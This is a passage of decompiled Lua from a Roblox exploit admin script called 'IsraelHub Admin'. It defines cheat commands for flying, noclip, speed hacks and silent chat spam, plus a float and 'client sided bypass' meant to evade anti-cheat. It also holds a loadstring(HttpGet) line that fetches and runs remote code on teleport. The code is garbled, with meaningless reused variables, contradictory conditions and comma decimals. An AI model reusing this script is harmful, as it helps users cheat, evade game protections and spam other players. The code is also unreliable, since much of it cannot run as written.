          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fly", {}, "fly your character", {3}, function(a, b, c)
        va("fly").CmdExtra[1] = tonumber(b[1]) or 3
        for fj, fk in next, vb():GetChildren() do
          if fk:IsA("BodyPosition") or not b then
            fk:Destroy()
          end
        end
        vc((Instance.new("BodyPosition")))
        vc((Instance.new("BodyGyro")))
        vd(ve(), "FloorMaterial")
        vd(ve(), "PlatformStand")
        Instance.new("BodyPosition").Parent = vb()
        Instance.new("BodyGyro").Parent = vb()
        Instance.new("BodyGyro").maxTorque = Vector3.new(1, 1, 1) * 9000000000
        Instance.new("BodyGyro").CFrame = vb().CFrame
        Instance.new("BodyPosition").maxForce = Vector3.new(1, 1, 1) * math.huge
        ve().PlatformStand = true
        coroutine.wrap(function()
          va.Position = vb().Position
          while next(vc("fly").CmdExtra) and not vc("fly").CmdExtra do
            vd = vc("fly").CmdExtra[1]
            if not vg.CurrentCamera.CoordinateFrame then
              va.Position = vb().CFrame * CFrame.new(0, 0, -vd).Position
              ve.CFrame = vg.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(vd * 15), 0, 0)
            end
            if not vg.CurrentCamera.CoordinateFrame then
            end
            if not vg.CurrentCamera.CoordinateFrame then
              va.Position = vb().CFrame * CFrame.new(0, 0, vd).Position
              ve.CFrame = vg.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(vd * 15), 0, 0)
            end
            va.Position = ((0 + 2) * CFrame.new(-vd, 0, 0) - vg.CurrentCamera.CoordinateFrame.lookVector * vd) * CFrame.new(vd, 0, 0).Position
            ve.CFrame = vg.CurrentCamera.CoordinateFrame
          end
          vj().PlatformStand = false
        end)()
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fly2", {}, "fly your character", {3}, function(a, b, c)
        if b then
        end
        va("fly2").CmdExtra[1] = 5
        for fj, fk in next, vb():GetChildren() do
          if not b or not b then
            fk:Destroy()
          end
        end
        vc((Instance.new("BodyPosition")))
        vc((Instance.new("BodyGyro")))
        vd(ve(), "FloorMaterial")
        vd(ve(), "PlatformStand")
        Instance.new("BodyPosition").Parent = vb()
        Instance.new("BodyGyro").Parent = vb()
        Instance.new("BodyGyro").maxTorque = Vector3.new(1, 1, 1) * 9000000000
        Instance.new("BodyGyro").CFrame = vb().CFrame
        Instance.new("BodyGyro").D = 0
        Instance.new("BodyPosition").maxForce = Vector3.new(1, 1, 1) * 9000000000
        Instance.new("BodyPosition").D = 400
        coroutine.wrap(function()
          va.Position = vb().Position
          while not vc("fly2").CmdExtra and not vc("fly2").CmdExtra do
            vd = vc("fly2").CmdExtra[1]
            if not ve.CurrentCamera.CoordinateFrame then
              vb().CFrame = vb().CFrame * CFrame.new(0, 0, -vd)
              va.Position = vb().Position
            end
            if vg.A then
              vb().CFrame = vb().CFrame * CFrame.new(-vd, 0, 0)
              va.Position = vb().Position
            end
            if vg.S then
              vb().CFrame = vb().CFrame * CFrame.new(0, 0, vd)
              va.Position = vb().Position
            end
            if not ve.CurrentCamera.CoordinateFrame then
              vb().CFrame = vb().CFrame * CFrame.new(vd, 0, 0)
              va.Position = vb().Position
            end
            vh.CFrame = ve.CurrentCamera.CoordinateFrame
            va.Position = vb().CFrame.Position
          end
        end)()
        return "now flying"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("flyspeed", {"fs"}, "changes the fly speed", {3, "1"}, function(a, b)
        va("fly").CmdExtra[1] = tonumber(b[1]) or va("fly2").CmdExtra[1]
        return tonumber(b[1]) and "flyspeed must be a number"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unfly", {}, "unflies your character", {3}, function()
        va("fly").CmdExtra = {}
        va("fly2").CmdExtra = {}
        for fd, fe in next, vb():GetChildren() do
          if not vb():GetChildren() or not vb():GetChildren() then
            fe:Destroy()
          end
        end
        vc().PlatformStand = false
        return "stopped flying"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("float", {}, "floats your character (uses grass to bypass some ac's)", {}, function(a, b, c)
        if b then
          Instance.new("Part").CFrame = CFrame.new(0, -10000, 0)
          Instance.new("Part").Size = Vector3.new(2, 0,2, 1,5)
          Instance.new("Part").Material = "Grass"
          va((Instance.new("Part")))
          Instance.new("Part").Parent = vb
          Instance.new("Part").Anchored = true
          AddConnection(RunService.RenderStepped:Connect(function()
            if not "float" and vb() then
              vc.CFrame = vb().CFrame * CFrame.new(0, -3,1, 0)
            else
              vc.CFrame = CFrame.new(0, -10000, 0)
            end
          end))
          c[1] = true
        end
        return "now floating"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unfloat", {"nofloat"}, "stops float", {}, function(a, b, c)
        if va("float").CmdExtra[1] then
          va("float").CmdExtra[1] = false
          return "stopped floating"
        end
        return "floating not on"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fov", {}, "sets your fov", {}, function(a, b)
        if b then
        end
        va(vb.CurrentCamera, "FieldOfView")
        vb.CurrentCamera.FieldOfView = 70
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noclip", {}, "noclips your character", {3}, function(a, b, c)
        c[1] = RunService.Stepped:Connect(function()
          for fd, fe in next, va:GetChildren() do
            if fe:IsA("BasePart") and fe.CanCollide then
              vb(fe, "CanCollide")
              fe.CanCollide = false
            end
          end
        end)
        vc.Notify(a, "Command", "noclip enabled")
        vd().Died:Wait()
        RunService.Stepped:Connect(function()
          for fd, fe in next, va:GetChildren() do
            if fe:IsA("BasePart") and fe.CanCollide then
              vb(fe, "CanCollide")
              fe.CanCollide = false
            end
          end
        end):Disconnect()
        return "noclip disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("clip", {}, "disables noclip", {}, function(a, b)
        if b then
          return "you aren't in noclip"
        else
          va("noclip").CmdExtra[1]:Disconnect()
          return "noclip disabled"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("anim", {"animation"}, "plays an animation", {3, "1"}, function(a, b)
        if b then
          return "there is no animation named " .. b[1]
        end
        Instance.new("Animation").AnimationId = "rbxassetid://" .. {
          idle = 180435571,
          idle2 = 180435792,
          walk = 180426354,
          run = 180426354,
          jump = 125750702,
          climb = 180436334,
          toolnone = 182393478,
          fall = 180436148,
          sit = 178130996,
          dance = 182435998,
          dance2 = 182491277,
          dance3 = 182491423
        }[b[1]]
        va():LoadAnimation((Instance.new("Animation"))):Play()
        return "playing animation " .. b[1]
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("lastcommand", {"lastcmd"}, "executes the last command", {}, function(a)
        vb(va[#va][1]).Function()(va[#va][2], va[#va][3], va[#va][4])
        return ("command %s executed"):format(va[#va][1])
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("whisper", {}, "whispers something to another user", {"2"}, function(a, b)
        for fk, fl in next, va(b[1]), nil do
          vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s %s"):format(fl.Name, (vb.concat(vb.shift(b), " "))), "All")
          vd.Notify(a or LocalPlayer, "Command", "Message sent to " .. fl.Name)
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("chat", {}, "sends a message", {"1"}, function(a, b)
        va.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(vb.concat(b, " "), "All")
        return "chatted " .. vb.concat(b, " ")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("silentchat", {"chatsilent"}, "sends a message but will not show in the chat (fires .Chatted signals)", {"1"}, function(a, b)
        Players:Chat((va.concat(b, " ")))
        return "silent chatted " .. va.concat(b, " ")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("spamsilentchat", {
        "spamchatlogs"
      }, "spams sending messages with what you want", {"1"}, function(a, b, c)
        for fk = 1, 100 do
          Players.Chat(Players, (va.concat(b, " ")))
        end
        AddConnection(Players.Chatted:Connect(function()
          for fd = 1, 100 do
            va(Players, vb)
          end
        end), c)
        return "spamming chat sliently"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unspamsilentchat", {
        "nospamsilentchat",
        "unspamchatlogs",
        "nospamchatlogs"
      }, "stops the spam of chat", {}, function()
        if not next(va("spamsilentchat").CmdExtra) then
          return "you are not spamming slient chat"
        end
        vb("spamsilentchat")
        return "stopped spamming slient chat"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("advertise", {}, "advertises the script", {}, function()
        va.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I am using IsraelHub Admin, join the server sUREWvYjgT", "All")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(a)
        if a == LocalPlayer then
          va:TeleportToPlaceInstance(game.PlaceId, game.JobId)
          return "Rejoining..."
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("serverhop", {"sh"}, "switches servers (optional: min or max)", {
        {"min", "max"}
      }, function(a, b)
        if a == LocalPlayer then
          va.Notify(a or LocalPlayer, nil, "Looking for servers...")
          if #vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data >= 1 then
            if b then
            end
            if (""):lower() == "min" then
            elseif (""):lower() == "max" then
            else
            end
            if not b then
              syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()")
            end
            vd:TeleportToPlaceInstance(game.PlaceId, vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end)[math.random(1, #vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end))].id)
            return ("joining server (%d/%d players)"):format(vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end)[math.random(1, #vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end))].playing, vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end)[math.random(1, #vc.filter(vb:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data, function(a, b)
              return b.playing ~= b.maxPlayers and b.id ~= game.JobId
            end))].maxPlayers)
          else
            return "no servers foudn"
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("changelogs", {"cl"}, "shows you the updates on IsraelHub Admin", {}, function()
        for fe, fg in next, vb.map(va:JSONDecode(game:HttpGetAsync("https://api.github.com/repos/fatesc/fates-admin/commits?per_page=100&path=main.lua")), function(a, b)
          return {
            Author = b.commit.author.name,
            Date = b.commit.committer.date:gsub("[T|Z]", " "),
            Message = b.commit.message
          }
        end), nil do
          print(([[
Author: %s
Date: %s
Message: %s]]):format(fg.Author, fg.Date, fg.Message))
        end
        return "changelogs loaded, press f9"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("whitelist", {"wl"}, "whitelists a user so they can use commands", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          vb[9 + 1] = fj
          vc.Notify(fj, "Whitelisted", ("You (%s) are whitelisted to use commands"):format(fj.Name))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("whitelisted", {
        "whitelistedusers"
      }, "shows all the users whitelisted to use commands", {}, function(a)
        if a or a then
        end
        return "no users whitelisted"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          if vb.find(vc, fj) then
            vb.remove(vc, vb.indexOf(vc, fj))
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("exceptions", {}, "blocks user from being used in stuff like kill all", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          vb[9 + 1] = fj
          vc.Notify(a, "Command", fj.Name .. " is added to the exceptions list")
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noexception", {}, "removes user from exceptions list", {"1"}, function(a, b)
        for fg, fh in next, va, nil do
          if fh.Name == b[1] then
            fh = nil
          end
          vb.Notify(a, "Command", b[1] .. " is removed from the exceptions list")
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("clearexceptions", {}, "removes users from exceptions list", {}, function(a, b)
        va = {}
        return "exceptions list cleared"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("commands", {"cmds"}, "shows you all the commands listed in IsraelHub Admin", {}, function()
        if nil then
          vc.SmoothScroll(vb.Frame.List, 0,14)
          for fe, fg in next, vd, nil do
            if not vb.Frame.List:FindFirstChild(fg.Name) then
              vc.Hover(ve:Clone(), "BackgroundColor3")
              vc.ToolTip(ve:Clone(), fg.Name .. "\n" .. fg.Description)
              ve:Clone().CommandText.Text = fg.Name .. ""
              ve:Clone().Name = fg.Name
              ve:Clone().Parent, ve:Clone().Visible = vb.Frame.List, true
            end
          end
          vb.Frame.List.CanvasSize = UDim2.fromOffset(0, vb.Frame.List.UIListLayout.AbsoluteContentSize.Y)
          vh = vb:Clone()
          vc.SetAllTrans(vb)
          va = true
        end
        vb.Visible = true
        vc.TweenAllTransToObject(vb, 0,25, vh)
        return "Commands Loaded"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("killscript", {}, "kills the script", {}, function(a)
        if a == LocalPlayer then
          va.deepsearch(vb, function(a, b)
            if type(b) == "userdata" and b.Disconnect then
              b:Disconnect()
            elseif type(b) == "boolean" then
              b = false
            end
          end)
          UI:Destroy()
          getgenv().F_A = nil
          setreadonly(vc, false)
          vc = vd
          setreadonly(vc, true)
          for fe, fg in next, getfenv() do
            getfenv()[fe] = nil
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("commandline", {"cmd", "cli"}, "brings up a cli, can be useful for when games detect by textbox", {}, function()
        if not va then
          va = true
          while true do
            rconsoleprint("@@WHITE@@")
            rconsoleprint("CMD >")
            if not rconsoleinput(""):split(" ") and rconsoleinput(""):split(" ")[1] ~= "" then
              if vb(rconsoleinput(""):split(" ")[1]).ArgsNeeded > #vc.shift((rconsoleinput(""):split(" "))) then
                rconsoleprint("@@YELLOW@@")
                return rconsoleprint(("Insuficient Args (you need %d)\n"):format(vb(rconsoleinput(""):split(" ")[1]).ArgsNeeded))
              end
              if rconsoleinput(""):split(" ") and Debug then
                rconsoleerr(pcall(function()
                  if not LocalPlayer then
                    rconsoleprint("@@GREEN@@")
                    rconsoleprint(va.Function()(LocalPlayer, vb, va.CmdExtra) .. "\n")
                  end
                  if #vc == 3 then
                    vc = vd.shift(vc)
                  end
                  vc[2 + 1] = {
                    va,
                    plr,
                    vb,
                    va.CmdExtra
                  }
                end))
              end
            else
              rconsolewarn("couldn't find the command " .. rconsoleinput(""):split(" ")[1] .. "\n")
            end
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("setprefix", {}, "changes your prefix", {"1"}, function(a, b)
        if not b then
          va = b[1]
          vb.Notify(a, "Command", ("your new prefix is now '%s'"):format(b[1]))
          return "use command saveprefix to save your prefix"
        else
          return "prefix must be a symbol"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("setcommandbarprefix", {"setcprefix"}, "sets your command bar prefix to whatever you input", {}, function()
        ChooseNewPrefix = true
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("saveprefix", {}, "saves your prefix", {}, function(a, b)
        if va().Prefix == vb and Enum.KeyCode[va().CommandBarPrefix] == vc then
          return "nothing to save, prefix is the same"
        else
          vd({
            Prefix = vb,
            CommandBarPrefix = tostring(vc):split(".")[3]
          })
          return "saved prefix"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("clear", {"clearcli", "cls"}, "clears the commandline (if open)", {}, function()
        if va then
          rconsoleclear()
          rconsolename("Admin Command Line")
          rconsoleprint([[

Command Line:
]])
          return "cleared console"
        end
        return "cli is not open"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("widebar", {}, "widens the command bar (toggle)", {}, function(a, b)
        WideBar = not WideBar
        if not Draggable then
          if b or b then
          end
          va.Tween(vb, "Quint", "Out", 0,5, {
            Position = UDim2.new(0,5, -100, 1, 5)
          })
        end
        va.Tween(vb, "Quint", "Out", 0,5, {
          Size = UDim2.new(0, WideBar and 200, 0, 35)
        })
        return ("widebar %s"):format(WideBar and "disabled")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("draggablebar", {"draggable"}, "makes the command bar draggable", {}, function(a)
        Draggable = not Draggable
        va = not va
        vb.Tween(vc, "Quint", "Out", 0,5, {
          Position = UDim2.new(0, vd.X, 0, vd.Y)
        })
        vb.Draggable(vc)
        vc.Input.Text = ""
        return ("draggable command bar %s"):format(Draggable and "disabled")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("chatprediction", {}, "enables command prediction on the chatbar", {}, function()
        ParentGui(PredictionClone, va)
        va:WaitForChild("ChatBar", 0,1):CaptureFocus()
        wait()
        va:WaitForChild("ChatBar", 0,1).Text = vb
        return "chat prediction enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("blink", {"blinkws"}, "cframe speed", {}, function(a, b, c)
        if b then
        end
        va("blink").CmdExtra[1] = tonumber(b[1]) or 5
        coroutine.wrap(function()
          while next(va("blink").CmdExtra) and wait(vb) do
            vc = va("blink").CmdExtra[1]
            if vd.W then
              ve().CFrame = ve().CFrame * CFrame.new(0, 0, -vc)
            end
            if vd.A then
              ve().CFrame = ve().CFrame * CFrame.new(-vc, 0, 0)
            end
            if not (ve().CFrame * CFrame.new(-vc, 0, 0)) then
              ve().CFrame = ve().CFrame * CFrame.new(0, 0, vc)
            end
            if vd.D then
              ve().CFrame = ve().CFrame * CFrame.new(vc, 0, 0)
            end
          end
        end)()
        return "blink enabled, for best results use shiftlock"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unblink", {
        "noblinkws",
        "unblink",
        "noblink"
      }, "stops cframe speed", {}, function()
        if va("blink").CmdExtra then
          return "blink is already disabled"
        end
        va("blink").CmdExtra = {}
        return "blink mode disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("x", {}, "", {"1"}, function(a, b)
        pcall(function()
          if not va(vb[1]) and not vd and LocalPlayer then
            for fd, fe in next, va(vb[1]) do
              if fe.Name == LocalPlayer.Name then
                LocalPlayer.kick(LocalPlayer, ve.concat(ve.shift(vb), " "))
              end
            end
          end
        end)
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(a, b, c)
        if va(b[1])[1] == LocalPlayer then
          return "You cannot orbit yourself."
        end
        if b then
        end
        if b then
        end
        AddConnection(RunService.Heartbeat:Connect(function()
          va.CFrame = CFrame.new(2 + 3, vb.Position)
        end), c)
        return "now orbiting around " .. va(b[1])[1].Name
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}, function()
        if not next(va("orbit").CmdExtra) then
          return "you are not orbiting around someone"
        end
        vb("orbit")
        return "orbit stopped"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("bypass", {
        "clientbypass"
      }, "client sided bypass", {3}, function()
        AddConnection(LocalPlayer.CharacterAdded:Connect(function()
          va():WaitForChild("Humanoid")
          wait(0,4)
          vb(vc())
          vb(vd(), ve() and va().UpperTorso)
          vg(vd())
          vg(vc())
        end))
        va():BreakJoints()
        vh.goto.Function = vh.tweento.Function
        vh.to.Function = vh.tweento.Function
        return "clientsided bypass enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("shiftlock", {}, "enables shiftlock in your game (some games have it off)", {}, function()
        if LocalPlayer.DevEnableMouseLock then
          return "shiftlock is already on"
        end
        LocalPlayer.DevEnableMouseLock = true
        return "shiftlock is now on"
      end)
      UI.Notification.Visible = false
      UI.Notification:Clone().Visible = false
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
